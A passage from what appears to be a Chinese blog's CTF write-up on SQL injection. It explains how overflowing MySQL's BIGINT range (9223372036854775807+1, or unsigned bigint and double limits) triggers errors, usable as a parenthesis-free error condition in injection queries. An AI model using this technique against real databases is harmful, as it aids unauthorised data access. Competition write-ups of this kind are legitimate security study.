<li><h4 id="最后的重点就是-9223372036854775807"><a href="#最后的重点就是-9223372036854775807" class="headerlink" title="最后的重点就是 9223372036854775807"></a>最后的重点就是 9223372036854775807</h4>  在mysql中，默认数字会视为<code>BIGINT</code>类型，也就是-9223372036854775808-9223372036854775807<br>  如果9223372036854775807+1就会溢出，然后报错。<br>  但是如果是9223372036854775808，他会默认把这个数字转换成<code>unsigned bigint</code>类型<br>  如下图<br>  <img src="/2022/09/28/%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9Bsql%E6%B3%A8%E5%85%A5/1.jpg" alt><br>  <img src="/2022/09/28/%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9Bsql%E6%B3%A8%E5%85%A5/2.jpg" alt><br>  那么如果直接设置9223372036854775808，他是不会报错的，因为会把他转化为<code>unsigned bigint</code>类型<br>  所以需要9223372036854775807+1，这样就超过bigint类型的最大范围<br>  当然也可以超过<code>unsigned bigint</code>，比如18446744073709551615+1，当然还有很多其它类型double类型之类的，都可以去溢出，原理相同，这种方法不会在语句中出现括号</li>
</ul>
<h2 id="4-参考链接"><a href="#4-参考链接" class="headerlink" title="4.参考链接"></a>4.参考链接</h2><ul>
<li>case:<a href="https://dev.mysql.com/doc/refman/8.0/en/case.html">https://dev.mysql.com/doc/refman/8.0/en/case.html</a></li>
<li>utf8mb4_bin:<a href="https://dev.mysql.com/doc/refman/8.0/en/charset-unicode-sets.html">https://dev.mysql.com/doc/refman/8.0/en/charset-unicode-sets.html</a></li>
<li>collate:<a href="https://www.jb51.net/article/214738.htm">https://www.jb51.net/article/214738.htm</a></li>
</ul>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
</search>
